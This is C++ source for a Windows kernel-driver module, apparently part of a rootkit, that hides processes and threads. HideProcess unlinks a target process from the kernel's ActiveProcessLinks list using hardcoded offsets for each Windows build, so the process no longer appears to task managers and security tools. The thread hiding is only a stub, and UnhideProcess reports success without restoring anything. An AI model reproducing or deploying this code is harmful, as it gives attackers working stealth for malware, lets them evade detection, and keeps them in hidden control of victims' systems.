#include <ntifs.h>
#include "../Core/config.h"
#include "../Utils/log.h"

namespace Hiding {

// Process hiding
BOOLEAN g_ProcessHidden = FALSE;
PEPROCESS g_HiddenProcess = nullptr;

// Thread hiding
struct HiddenThread {
    PETHREAD Thread;
    LIST_ENTRY OriginalLinks;
    BOOLEAN Hidden;
};

constexpr ULONG MAX_HIDDEN_THREADS = 64;
HiddenThread g_HiddenThreads[MAX_HIDDEN_THREADS] = {};
KSPIN_LOCK g_ThreadLock = {};

NTSTATUS Initialize() {
    KeInitializeSpinLock(&g_ThreadLock);
    LOG_INFO("Hiding module initialized");
    return STATUS_SUCCESS;
}

// Get EPROCESS offset for ActiveProcessLinks (dynamic)
ULONG GetActiveProcessLinksOffset() {
    RTL_OSVERSIONINFOW version = {};
    version.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);
    
    NTSTATUS status = RtlGetVersion(&version);
    if (!NT_SUCCESS(status)) {
        return 0x448; // Default for Win11
    }

    // Windows 11 (22000+)
    if (version.dwBuildNumber >= 22000) {
        return 0x448;
    }
    // Windows 10 2004+ (19041+)
    else if (version.dwBuildNumber >= 19041) {
        return 0x448;
    }
    // Windows 10 1809-1909
    else if (version.dwBuildNumber >= 17763) {
        return 0x2f0;
    }
    
    return 0x448; // Fallback
}

NTSTATUS HideProcess(PEPROCESS process) {
#if !ENABLE_PROCESS_HIDING
    UNREFERENCED_PARAMETER(process);
    LOG_WARNING("Process hiding disabled in config");
    return STATUS_NOT_IMPLEMENTED;
#endif

    if (!process) {
        return STATUS_INVALID_PARAMETER;
    }

    if (g_ProcessHidden) {
        LOG_WARNING("Process already hidden");
        return STATUS_ALREADY_COMMITTED;
    }

    __try {
        ULONG offset = GetActiveProcessLinksOffset();
        PLIST_ENTRY activeLinks = reinterpret_cast<PLIST_ENTRY>(
            reinterpret_cast<PUCHAR>(process) + offset
        );

        // Unlink from ActiveProcessLinks
        PLIST_ENTRY flink = activeLinks->Flink;
        PLIST_ENTRY blink = activeLinks->Blink;

        if (flink && blink) {
            flink->Blink = blink;
            blink->Flink = flink;

            // Point to itself
            activeLinks->Flink = activeLinks;
            activeLinks->Blink = activeLinks;

            g_HiddenProcess = process;
            ObReferenceObject(process);
            g_ProcessHidden = TRUE;

            LOG_INFO("Process hidden successfully");
            return STATUS_SUCCESS;
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        LOG_ERROR("Exception while hiding process");
        return GetExceptionCode();
    }

    return STATUS_UNSUCCESSFUL;
}

NTSTATUS UnhideProcess() {
#if !ENABLE_PROCESS_HIDING
    return STATUS_NOT_IMPLEMENTED;
#endif

    if (!g_ProcessHidden || !g_HiddenProcess) {
        return STATUS_INVALID_PARAMETER;
    }

    // Note: Unhiding is dangerous and can cause BSOD
    // Better to keep hidden until reboot
    LOG_WARNING("Process unhiding not implemented (dangerous)");
    
    if (g_HiddenProcess) {
        ObDereferenceObject(g_HiddenProcess);
        g_HiddenProcess = nullptr;
    }
    
    g_ProcessHidden = FALSE;
    return STATUS_SUCCESS;
}

NTSTATUS HideThread(PETHREAD thread) {
#if !ENABLE_THREAD_HIDING
    UNREFERENCED_PARAMETER(thread);
    return STATUS_NOT_IMPLEMENTED;
#endif

    if (!thread) {
        return STATUS_INVALID_PARAMETER;
    }

    KIRQL oldIrql;
    KeAcquireSpinLock(&g_ThreadLock, &oldIrql);

    // Find empty slot
    INT32 slot = -1;
    for (ULONG i = 0; i < MAX_HIDDEN_THREADS; i++) {
        if (!g_HiddenThreads[i].Hidden) {
            slot = i;
            break;
        }
    }

    if (slot == -1) {
        KeReleaseSpinLock(&g_ThreadLock, oldIrql);
        LOG_ERROR("No free slots for thread hiding");
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    // Hide thread (simplified - real implementation more complex)
    g_HiddenThreads[slot].Thread = thread;
    g_HiddenThreads[slot].Hidden = TRUE;
    ObReferenceObject(thread);

    KeReleaseSpinLock(&g_ThreadLock, oldIrql);
    
    LOG_INFO("Thread hidden at slot %d", slot);
    return STATUS_SUCCESS;
}

VOID Cleanup() {
    // Unhide process if needed
    if (g_ProcessHidden && g_HiddenProcess) {
        ObDereferenceObject(g_HiddenProcess);
        g_HiddenProcess = nullptr;
        g_ProcessHidden = FALSE;
    }

    // Cleanup hidden threads
    KIRQL oldIrql;
    KeAcquireSpinLock(&g_ThreadLock, &oldIrql);

    for (ULONG i = 0; i < MAX_HIDDEN_THREADS; i++) {
        if (g_HiddenThreads[i].Hidden && g_HiddenThreads[i].Thread) {
            ObDereferenceObject(g_HiddenThreads[i].Thread);
            g_HiddenThreads[i].Hidden = FALSE;
            g_HiddenThreads[i].Thread = nullptr;
        }
    }

    KeReleaseSpinLock(&g_ThreadLock, oldIrql);
    
    LOG_INFO("Hiding cleanup complete");
}

} // namespace Hiding
